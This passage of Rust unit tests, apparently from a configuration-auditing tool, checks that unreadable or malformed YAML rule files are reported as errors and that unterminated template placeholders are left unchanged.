    fn an_unreadable_rule_file_is_reported_not_silently_dropped() {
        use std::os::unix::fs::PermissionsExt;

        let tmp = tempfile::tempdir().unwrap();
        write_rule(tmp.path(), "unreadable.yaml", "id: BLWK-TEST-001\n");
        let path = tmp.path().join("unreadable.yaml");
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).unwrap();

        let (rules, errors) = load_rules(tmp.path());

        // Restore permissions so the tempdir can clean itself up.
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();

        // Running as root (e.g. some CI containers) ignores the permission bits entirely —
        // skip the assertion in that case rather than asserting a false failure.
        if !is_running_as_root() {
            assert!(rules.is_empty());
            assert_eq!(errors.len(), 1);
        }
    }

    #[test]
    fn render_template_leaves_an_unterminated_placeholder_verbatim() {
        let fact = crate::models::Fact::new();
        assert_eq!(
            render_template("value: {{ unclosed", &fact),
            "value: {{ unclosed"
        );
    }

    #[test]
    fn rule_with_bad_condition_is_reported() {
        let tmp = tempfile::tempdir().unwrap();
        write_rule(
            tmp.path(),
            "bad-condition.yaml",
            r#"
id: BLWK-TEST-001
title: t
category: c
severity: low
collector: sshd_config
condition: "this is not == a valid ["
explain: "e"
fix: "f"
"#,
        );
        let (rules, errors) = load_rules(tmp.path());
        assert!(rules.is_empty());
        assert_eq!(errors.len(), 1);
        assert!(errors[0].message.contains("BLWK-TEST-001"));
    }
}
